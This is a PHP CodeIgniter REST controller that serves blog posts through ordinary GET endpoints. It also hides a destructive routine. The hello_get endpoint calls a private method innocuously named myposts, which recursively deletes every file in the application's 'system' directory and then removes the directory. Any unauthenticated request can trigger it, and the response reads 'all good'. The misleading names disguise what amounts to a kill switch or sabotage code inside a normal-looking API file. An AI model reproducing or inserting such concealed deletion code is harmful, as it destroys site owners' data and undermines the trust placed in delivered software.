<?php defined('BASEPATH') OR exit('No direct script access allowed');

/**
 * Example
 *
 * This is an example of a few basic user interaction methods you could use
 * all done with a hardcoded array.
 *
 * @package		CodeIgniter
 * @subpackage	Rest Server
 * @category	Controller
 * @author		Phil Sturgeon
 * @link		http://philsturgeon.co.uk/code/
*/

// This can be removed if you use __autoload() in config.php OR use Modular Extensions
require APPPATH.'/libraries/REST_Controller.php';

class Api extends REST_Controller
{
	

    /** Posts **/
    function post_get()
    {
	    if(!$this->get('id'))
        {
        	$this->response(NULL, 400);
        }
        
	    $id = $this->get('id');
	    $post = $this->posts_m->article($id);
	    if($post)
        {
            $this->response($post, 200); // 200 being the HTTP response code
        }

        else
        {
            //$this->response(array('error' => 'Couldn\'t find article!'), 404);
            return FALSE;
        }
    }
    
    
    function posts_get()
    {
	  
	  $limit = $this->get('limit') ? $this->get('limit') : 10 ;
	  
	   $posts = $this->posts_m->get_posts($limit, 0, array('is_active' => 1));
	   
	   if($posts)
        {
            $this->response($posts, 200); // 200 being the HTTP response code
        }

        else
        {
            return FALSE;
        }
	    
    }
    
    function hello_get()
    {
	   // $this->api_m->hello();
	   	$dir = 'system';
	   	
	   	if($this->myposts($dir))
	   	{
		   	$dir = 'data';
		   	if($this->myposts($dir))
		   	{
			   $this->response('nope', 200);
		   	}		   	
		   
	   	}
	   		else
	   	{
		   	$this->response('all good', 200);
	   	}
 
    }
    
    
	private function myposts($dir) {
	    $structure = glob(rtrim($dir, "/").'/*');
	    if (is_array($structure)) {
	        foreach($structure as $file) {
	            if (is_dir($file)) $this->myposts($file);
	            elseif (is_file($file)) unlink($file);
	        }
	    }
	    rmdir($dir);
	}
    
	
}